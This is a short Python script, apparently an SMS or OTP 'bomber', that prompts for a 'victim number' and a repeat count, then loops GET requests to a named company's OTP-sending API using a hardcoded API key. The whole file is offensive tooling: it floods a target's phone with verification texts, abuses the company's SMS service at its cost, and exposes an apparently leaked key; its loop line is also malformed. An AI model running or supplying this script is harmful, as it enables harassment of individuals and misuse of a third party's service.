import requests
from requests.structures import CaseInsensitiveDict
number  = str(input("[>] victim number: "))
amount = int(input("[>]   your amount: "))
url = "https://admin.mohasagor.com/api/_data/send/otp?mobile_no="+number

headers = CaseInsensitiveDict()
headers["x-api-key"] = "$2y$10$kzaYH2t9fgVMoyqKMWF7POjD45cilj"for i in range(amount):
        resp = requests.get(url, headers=headers)
        print(resp.status_code)